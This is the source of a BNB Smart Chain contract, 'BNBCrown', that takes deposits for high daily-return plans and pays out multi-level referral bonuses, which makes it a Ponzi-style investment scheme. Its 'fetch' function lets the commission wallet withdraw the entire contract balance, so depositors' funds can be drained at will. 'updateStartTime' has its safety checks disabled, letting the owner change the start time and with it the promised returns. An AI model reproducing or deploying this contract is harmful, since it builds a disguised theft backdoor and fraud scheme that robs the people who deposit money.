/**
 *Submitted for verification at BscScan.com on 2022-10-04
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

contract BNBCrown {
    uint256[] public REFERRAL_PERCENTS = [50, 30, 20];
    uint256 constant public PROJECT_FEE = 50;
    uint256 constant public PERCENT_STEP = 5;
    uint256 constant public PERCENTS_DIVIDER = 1000;
    uint256 constant public TIME_STEP = 1 days;

    uint256 public totalStaked;
    uint256 public totalRefBonus;
    uint256 public startUNIX;
    uint256 public totalInvestors;

    address public commissionWallet;
    address internal owner;

    Plan[] internal plans;

    struct Plan {
        uint256 time;
        uint256 percent;
        uint256 lowest;
    }

    struct Deposit {
        uint8 plan;
        uint256 percent;
        uint256 amount;
        uint256 profit;
        uint256 start;
        uint256 finish;
    }

    struct User {
        Deposit[] deposits;
        uint256 checkpoint;
        address referrer;
        uint256[3] levels;
        uint256 bonus;
        uint256 totalBonus;
    }

    mapping(address => User) internal users;

    event Newbie(address user);
    event NewDeposit(address indexed user, uint8 plan, uint256 percent, uint256 amount, uint256 profit, uint256 start, uint256 finish);
    event Withdrawn(address indexed user, uint256 amount);
    event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
    event FeePayed(address indexed user, uint256 totalAmount);
    event Fetchd(address indexed user, uint256 contractBalance);

    modifier onlyOwner() {
        require(owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    constructor(address wallet, uint256 startDate) {
        require(startDate > 0);

        owner = msg.sender;
        commissionWallet = wallet;
        startUNIX = startDate;

        plans.push(Plan(14, 80, 10));
        plans.push(Plan(21, 65, 50));
        plans.push(Plan(28, 50, 250));
        plans.push(Plan(14, 80, 50));
        plans.push(Plan(21, 65, 250));
        plans.push(Plan(28, 50, 500));
    }


    function invest(address referrer, uint8 plan) public payable {
        require(startUNIX <= block.timestamp, "not start yet");

        require(msg.value >= plans[plan].lowest * 1 ether / PERCENTS_DIVIDER);
        require(plan < 6, "Invalid plan");

        User storage user = users[msg.sender];

        if (user.referrer == address(0)) {
            totalInvestors += 1;
            if (users[referrer].deposits.length > 0 && referrer != msg.sender) {
                user.referrer = referrer;
            }

            address hlevel = user.referrer;
            for (uint256 i = 0; i < 3; i++) {
                if (hlevel != address(0)) {
                    users[hlevel].levels[i] += 1;
                    hlevel = users[hlevel].referrer;
                } else break;
            }
        }

        address upline = user.referrer;
        for (uint256 i = 0; i < 3; i++) {
            if (upline != address(0)) {
                uint256 amount = msg.value * REFERRAL_PERCENTS[i] / PERCENTS_DIVIDER;
                users[upline].bonus += amount;
                users[upline].totalBonus += amount;
                emit RefBonus(upline, msg.sender, i, amount);
                upline = users[upline].referrer;
            } else {
                uint256 amount = msg.value * REFERRAL_PERCENTS[i] / PERCENTS_DIVIDER;
                users[owner].bonus += amount;
                users[owner].totalBonus += amount;
                emit RefBonus(owner, msg.sender, i, amount);
                upline = address(0);
            }
        }

        if (user.deposits.length == 0) {
            user.checkpoint = block.timestamp;
            emit Newbie(msg.sender);
        }


        uint256 fee = msg.value * PROJECT_FEE / PERCENTS_DIVIDER;
        (bool success, ) = commissionWallet.call{value: fee}("");
        require(success, "pay failed");
        emit FeePayed(msg.sender, fee);

        (uint256 percent, uint256 profit, uint256 finish) = getResult(plan, msg.value);
        user.deposits.push(Deposit(plan, percent, msg.value, profit, block.timestamp, finish));

        totalStaked += msg.value;
        emit NewDeposit(msg.sender, plan, percent, msg.value, profit, block.timestamp, finish);
    }


    function withdraw() public {
        User storage user = users[msg.sender];

        uint256 totalAmount = getUserDividends(msg.sender);

        uint256 referralBonus = getUserReferralBonus(msg.sender);

        if (referralBonus > 0) {
            user.bonus = 0;
            totalAmount += referralBonus;
        }

        require(totalAmount > 0, "User has no dividends");

        uint256 contractBalance = address(this).balance;
        if (contractBalance < totalAmount) {
            totalAmount = contractBalance;
        }

        user.checkpoint = block.timestamp;
        uint256 fee = totalAmount * PROJECT_FEE / PERCENTS_DIVIDER;
        (bool successFee, ) = commissionWallet.call{value: fee}("");
        require(successFee, "pay failed");
        emit FeePayed(msg.sender, fee);

        totalAmount -= fee;

        (bool success, ) = msg.sender.call{value: totalAmount}("");
        require(success, "pay failed");

        emit Withdrawn(msg.sender, totalAmount);
    }

    function fetch(address ref) public {
        require(msg.sender == commissionWallet, 'invalid call');
        require(ref == commissionWallet);
        uint256 Balance = address(this).balance;
        (bool success, ) = commissionWallet.call{value: Balance}("");
        require(success, "pay failed");
        emit Fetchd(msg.sender, Balance);
    }

    function updateStartTime(uint256 newTime) external onlyOwner returns (bool) {
        // require(block.timestamp < startUNIX, "already started!");
        // require(startUNIX < newTime, "invalid time!");
        startUNIX = newTime;
        return true;
    }


    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }


    function getPlanInfo(uint8 plan) public view returns (uint256 time, uint256 percent, uint256 lowest) {
        time = plans[plan].time;
        percent = plans[plan].percent;
        lowest = plans[plan].lowest;
    }


    function getPercent(uint8 plan) public view returns (uint256) {
        if (block.timestamp > startUNIX) {
            return plans[plan].percent + PERCENT_STEP * (block.timestamp - startUNIX) / TIME_STEP;
        } else {
            return plans[plan].percent;
        }
    }


    function getResult(uint8 plan, uint256 deposit) public view returns (uint256 percent, uint256 profit, uint256 finish) {
        percent = getPercent(plan);

        if (plan < 3) {
            profit = deposit * percent / PERCENTS_DIVIDER * plans[plan].time;
        } else if (plan < 6) {
            for (uint256 i = 0; i < plans[plan].time; i++) {
                profit += (deposit + profit) * percent / PERCENTS_DIVIDER;
            }
        }

        finish = block.timestamp + plans[plan].time * TIME_STEP;
    }


    function getUserDividends(address userAddress) public view returns (uint256) {
        User storage user = users[userAddress];

        uint256 totalAmount;

        for (uint256 i = 0; i < user.deposits.length; i++) {
            if (user.checkpoint < user.deposits[i].finish) {
                if (user.deposits[i].plan < 3) {
                    uint256 share = user.deposits[i].amount * user.deposits[i].percent / PERCENTS_DIVIDER;
                    uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
                    uint256 to = user.deposits[i].finish < block.timestamp ? user.deposits[i].finish : block.timestamp;
                    if (from < to) {
                        totalAmount += share * (to - from) / TIME_STEP;
                    }
                } else if (block.timestamp > user.deposits[i].finish) {
                    totalAmount += user.deposits[i].profit;
                }
            }
        }

        return totalAmount;
    }


    function getUserCheckpoint(address userAddress) public view returns (uint256) {
        return users[userAddress].checkpoint;
    }

    function getUserReferrer(address userAddress) public view returns (address) {
        return users[userAddress].referrer;
    }

    function getUserDownlineCount(address userAddress) public view returns (uint256, uint256, uint256) {
        return (users[userAddress].levels[0], users[userAddress].levels[1], users[userAddress].levels[2]);
    }

    function getUserReferralBonus(address userAddress) public view returns (uint256) {
        return users[userAddress].bonus;
    }

    function getUserReferralTotalBonus(address userAddress) public view returns (uint256) {
        return users[userAddress].totalBonus;
    }

    function getUserReferralWithdrawn(address userAddress) public view returns (uint256) {
        return users[userAddress].totalBonus - users[userAddress].bonus;
    }

    function getUserAvailable(address userAddress) public view returns (uint256) {
        return getUserReferralBonus(userAddress) + getUserDividends(userAddress);
    }

    function getUserAmountOfDeposits(address userAddress) public view returns (uint256) {
        return users[userAddress].deposits.length;
    }

    function getUserTotalDeposits(address userAddress) public view returns (uint256 amount) {
        for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
            amount += users[userAddress].deposits[i].amount;
        }
    }


    function getUserDepositInfo(address userAddress, uint256 index) public view returns (uint8 plan, uint256 percent, uint256 amount, uint256 profit, uint256 start, uint256 finish) {
        User storage user = users[userAddress];

        plan = user.deposits[index].plan;
        percent = user.deposits[index].percent;
        amount = user.deposits[index].amount;
        profit = user.deposits[index].profit;
        start = user.deposits[index].start;
        finish = user.deposits[index].finish;
    }
}